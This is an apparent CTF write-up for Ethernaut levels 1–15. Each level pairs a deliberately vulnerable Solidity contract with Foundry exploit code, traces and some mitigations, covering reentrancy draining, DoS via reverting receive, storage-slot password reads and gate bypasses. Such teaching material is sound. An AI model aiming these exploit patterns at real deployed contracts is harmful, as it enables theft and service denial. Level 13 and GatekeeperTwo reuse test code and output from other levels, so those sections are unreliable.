# Ethernaut Challenges

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/ethernaut)

## Level 1: Hello Ethernaut

### 🔍 Vulnerable Function
```solidity
function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
```

**Vulnerability**: The `password` variable is marked as `public`, which allows anyone to call `.password()` and get the secret directly.

### 🧪 Exploit Test
```solidity
function test_pass_attack() public {
    vm.startPrank(attacker);
    assertEq(resultpass, instance.password(), "password failed");

}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
```


---

## Level 2: Fallback

### 🔍 Vulnerable Function
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

**Vulnerability**: The fallback function allows any contributor to become the `owner` by sending ETH directly to the contract. The original `owner` logic is also flawed—it can be overtaken easily by minimal contributions.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance >= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
```



---

## Level 3: Fallout

### 🔍 Vulnerable Function
```solidity
function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
```

**Vulnerability**: The function `Fal1out()` is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the `owner`.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
```



---

## Level 4: CoinFlip

### 🔍 Vulnerable Function
```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

**Vulnerability**: Uses predictable `blockhash` to generate randomness. The attacker can precompute the same value and always win the flip.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i < 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
```

---

## Level 5: Telephone

### 🔍 Vulnerable Function
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

**Vulnerability**: The contract uses `tx.origin` instead of `msg.sender` for access control. An attacker can create a contract that calls this function, with the `tx.origin` being a user (player), and `msg.sender` being the attack contract. This bypasses the condition and changes the ownership.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
```



---

## Level 6:Delegation

### 🔍 Vulnerable Function

```solidity
fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

**Vulnerability**: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.

### 🧪 Exploit Test
```solidity
function test_attack() public {
    vm.startPrank(attacker);
    (bool success, ) = address(delegation).call(
        abi.encodeWithSignature("pwn()")
    );
    require(success, "Call failed");
    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
    vm.stopPrank();
}

```
---

## Level 7:Force

### 🔍 Vulnerable Function

```solidity
// Force contract has no receive/fallback or payable function
contract Force {
   
}
```

**Vulnerability**: Ether can still be forcibly sent using selfdestruct.

### 🛠️  Exploit Contract (ForceDestruct)
```solidity
 contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}

```

### 🧪 Exploit Test
```solidity 
    function test_attack() public {
    vm.startPrank(attacker);
    forceDestruct = new ForceDestruct();
    forceDestruct.attack{value: 1 ether}(payable(address(force)));
    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
    vm.stopPrank();
    }

```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 131011)
Traces:
  [131011] level7Test::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ new ForceDestruct
    ├─ ForceDestruct::attack{value: 1 ether}(Force)
    │   └─ [SelfDestruct]
    ├─ assertEq(1 ether, 1 ether)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
```
---


## Level 8:Valut

### 🔍 Vulnerable Function

```solidity
 bool public locked;//storage slot0
 bytes32 private password;//storage slot1
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}

```

**Vulnerability**: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(attacker);
    // Get the password from storage slot 1
    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
    vault.unlock(_password);
    assertFalse(vault.locked());
    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 11812)
Traces:
  [16612] VaultTest::test_attack()
    ├─ VM::startPrank(attacker)
    ├─ VM::load(Vault, slot 1)
    ├─ Vault::unlock(password)
    ├─ Vault::locked() → false
    ├─ VM::assertFalse(false)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
```
---

## Level 9:Token

### 🔍 Vulnerable Function

```solidity
 function transfer(address _to, uint256 _value) public returns (bool) {
    unchecked {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
}
```

**Vulnerability**: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.

📝 Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes


### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.startPrank(player);
    
    // Initial balance of player: 20 tokens
    assertEq(token.balanceOf(player), 20);

    // Transfer more than balance (21 tokens), triggers underflow
    bool success = token.transfer(attacker, 21);
    assertTrue(success);

    // Player's balance underflows to a very large number
    uint256 _balanceofplayer = token.balanceOf(player);
    assertGt(_balanceofplayer, 20);

    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 47312)
Traces:
  [47312] TokenTest::test_attack()
    ├─ VM::startPrank(player)
    ├─ Token::balanceOf(player) → 20
    ├─ assertEq(20, 20)
    ├─ Token::transfer(attacker, 21) → true
    ├─ assertTrue(true)
    ├─ Token::balanceOf(player) → 1.157e77
    ├─ assertGt(1.157e77, 20)
    └─ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 988.39µs
```
---

## Level 10:King
**AttackDesc**:
A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
If one function fails because of this, others may not be able to use the contract.
In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
This locks the contract and nobody else can play the game.
DoS attacks make the contract unusable for honest users.

### 🔍 Vulnerable Function

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // ❌ vulnerable to DoS
    king = msg.sender;
    prize = msg.value;
}

```

**Vulnerability**: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.

### 🛠️  Exploit Contract 
```solidity
 contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value >= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed"); // Reverts to block
    }
}
```

### 🧪 Exploit Test
```solidity 
   function test_attack() public {
    vm.prank(attackerEOA);
    attack.attack{value: 2 ether}(); // attacker becomes king

    assertEq(king._king(), address(attack)); // ✅ attacker is king

    vm.prank(player);
    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
    assertFalse(success, "Player should not be able to become king anymore"); // ❌ fails
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 71672)
Traces:
  [71672] KingTest::test_attack()
    ├─ VM::prank(attackerEOA)
    ├─ Attacker::attack{value: 2 ether}()
    │   ├─ King::receive{value: 2 ether}()
    │   │   ├─ player::fallback{value: 2 ether}()
    │   │   └─ [Stop]
    │   └─ [Stop]
    ├─ King::_king() → Attacker
    ├─ VM::assertEq(Attacker, Attacker)
    ├─ VM::prank(player)
    ├─ King::receive{value: 3 ether}()
    │   ├─ Attacker::receive{value: 3 ether}() → [Revert] sent eth failed
    │   └─ [Revert]
    ├─ VM::assertFalse(false, "Player should not be able to become king anymore")
    └─ [Stop]

Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
```
---

## Level 11:Reentrancy
**AttackDesc**:
This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract's state is updated, allowing them to drain all the funds.

### 🔍 Vulnerable Function

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

**Vulnerability**: 
 The contract sends ETH to msg.sender using .call before updating the internal state balances[msg.sender].
This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance

### 🛠️  Exploit Contract 
```solidity
 contract Attack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance > 0 && bal > 0) {
            uint256 toWithdraw = bal < 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
```

### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    vm.startPrank(attacker);
    MaliciousContract malicious = new MaliciousContract(reentrance);
    uint256 balanceBefore = address(malicious).balance;
    uint256 _reentrantbalance = address(reentrance).balance;

    vm.expectRevert("arithmetic underflow or overflow");
    malicious.attack{value: 1 ether}();
    
    assertEq(address(reentrance).balance, 0);
    assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);
    vm.stopPrank();
}
```
### 📋 Test Output
``` text
Logs:
  balance of the contract before 1000000000000000000
  successfully donated
  balance of reentrance:  2000000000000000000
  balance of this contract:  0

Traces:
  ...
  ├─ Reentrance::withdraw(1 ether)
  │   ├─ MaliciousContract::receive()
  │   │   ├─ Reentrance::balanceOf()
  │   │   └─ Reentrance::withdraw(1 ether)
  │   │       ├─ MaliciousContract::receive() <== RECURSIVE CALL
  │   │       └─ Revert: panic: arithmetic underflow or overflow (0x11)
```
### 🔒Recommended Mitigation
Use the Checks-Effects-Interactions pattern to prevent reentrancy:
``` solidity
  function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // ✅ Effect: update state before interaction
    balances[msg.sender] -= _amount;

    // ✅ Interaction: external call after state change
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}

```
---
## Level 12: Elevator
**AttackDesc**:
The Elevator contract relies on an external Building contract to determine whether a floor is the last floor or not using the isLastFloor function.
However, it makes two separate calls to this function and does not expect the return values to differ between them.

This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.

### 🔍 Vulnerable Function

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
```

**Vulnerability**: 
 The contract calls isLastFloor() twice: once for the check, and once to set the top state.

An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic

### 🛠️  Exploit Contract
✅ First call to isLastFloor returns false → passes the if check.
✅ Second call returns true → sets top = true.

```solidity
 contract BuildingAttack is Building {
    Elevator public elevator;
    bool public flipFlop = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(1); // call from attacker
    }

    function isLastFloor(uint256) external override returns (bool) {
        flipFlop = !flipFlop;
        return flipFlop;
    }
}
```
### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

```
### 🔒Recommended Mitigation
Ensure external calls are not made multiple times for critical logic — or cache the result:
``` solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
```
---
## Level 13: Privacy
**AttackDesc**:
The contract stores a private bytes32[3] array called data, and the unlock() function requires the first 16 bytes of data[2] to unlock the contract.

Even though the array is marked private, all contract storage is publicly accessible on the blockchain — which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.

### 🔍 Vulnerable Function
```solidity
function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
```

**Vulnerability**: 
Solidity stores contract variables sequentially in storage slots:

⚡Slot 0: locked

⚡Slot 1: ID

⚡Slot 2: flattening, denomination, awkwardness

⚡Slot 3, 4, 5: data[0], data[1], data[2]

⚡Slot 5 holds data[2] — and the unlock() function casts it to bytes16, so we only need the first 16 bytes.

### 🛠️  Exploit Contract
vm.load() reads the raw 32 bytes from a given storage slot.
The value is then cast to bytes16 and passed into the unlock() function.

```solidity
function test_attack() public {
    bytes32 value = vm.load(address(privacy), bytes32(uint256(5)));
    console.log("value of slot 5", string(abi.encodePacked(value)));

    privacy.unlock(bytes16(value));
    assertTrue(privacy.locked() == false);
}
```


### 🧪 Exploit Test
```solidity 
  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

```
### 🔒Recommended Mitigation
Ensure external calls are not made multiple times for critical logic — or cache the result:
``` solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
```
---
## Level 14 GateKeeperone

**AttackDesc**:
To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.

### 🔍 Vulnerable Function

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // Gate One
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0); // Gate Two
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // Part 1: lower 4 bytes == lower 2 bytes
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        // Part 2: lower 4 bytes != full 8 bytes
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        // Part 3: lower 2 bytes == lower 2 bytes of tx.origin
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability**: 
Gate One: Requires a contract call (msg.sender != tx.origin).

Gate Two: The remaining gas must be a multiple of 8191 → gasleft() % 8191 == 0.

Gate Three:

The last 4 bytes of gateKey must match the last 2 bytes of the tx.origin.

But full gateKey must not equal the last 4 bytes alone.

This forces manipulation of only the lower 2 bytes of a crafted bytes8.

### 🛠️  Exploit Contract


Gate One: Bypassed using an external contract call (attacker != tx.origin).

Gate Two: Brute-forced by adjusting gas until gasleft() % 8191 == 0.

Gate Three: Crafted bytes8:

Lower 2 bytes match tx.origin.

Full 8 bytes ≠ 4 bytes → satisfies all require() checks.

Result: entrant = tx.origin set successfully.
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {GatekeeperOne} from "../src/level14.sol";
import {Test, console} from "forge-std/Test.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");
    bytes8 public gateKey;

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        vm.startPrank(player); // tx.origin must be player
        gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);

        // Extract last 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        // Combine it with a prefix so uint64(gateKey) != uint32(gateKey)
        uint64 crafted = uint64(0xABCDEFAB00000000) | origin16;
        gateKey = bytes8(crafted);

        // Bruteforce correct gas offset
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i * 8191 + 200 + 8191
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                console.log("✅ Attack Successful!");
                console.log("i value", i);
                console.log("gasleft", gasleft());
                string memory str = string(abi.encodePacked(gateKey));
                console.log("gateKey", str);
                break;
            }
        }

        vm.stopPrank();
    }
}

```
### 📋 Test Output

``` text
    [PASS] test_attack() (gas: ~XXXXX)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [XXXXX] GateKeeperOneTest::test_attack()
    ├─ GatekeeperOne::enter(0xabcdefab00001f38)
    ├─ GatekeeperOne::entrant() ← 0x...player
    └─ assertTrue(true)

```
---
## GateKeeperTwo

**Attack Description**:
To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.

### 🔍 Vulnerable Function

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
                uint64(_gateKey) == 
                type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) 
        public 
        gateOne 
        gateTwo 
        gateThree(_gateKey) 
        returns (bool) 
    {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability**: 
1.Gate One: Requires that msg.sender != tx.origin, so it can only be bypassed by making a contract call (from a contract).

2.Gate Two: Uses extcodesize(caller()), which checks that the caller is a contract (not an externally owned account). This can be bypassed by calling the function from a contract constructor, as msg.sender will be the contract itself.

3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.


### 🛠️  Exploit Contract

Gate One: Bypassed using an external contract call.

Gate Two: Bypassed by deploying the attack contract, which makes the call from the constructor.

Gate Three: The gateKey is crafted using the XOR relationship A^B = C.

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/level15.sol";
import {Test, console} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test_attack() public {
        // first gate is passed by using tx.origin
        // second gate is extcodesize, it is passed only if the msg.sender contract is not deployed (call from constructor)
        // third gate is passed A^B=C, so we find the value of B (gateKey) using XOR logic
        Attack attack = new Attack(gatekeeperTwo); // deploy the contract and call the constructor to solve the second gate
    }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        // msg.sender is the address of the contract (Attack) during construction
        // A^B=C, solve for B (gateKey)
        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ 
            type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 142998)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [142998] GatekeeperTwoTest::test_attack()
    ├─ [107817] → new Attack@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ [23405] GatekeeperTwo::enter(0x8709462d480d6ec3)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 290 bytes of code
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.01ms (8.27ms CPU time)

Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```
---
✅ Ready for **Level 16** — coming soon!





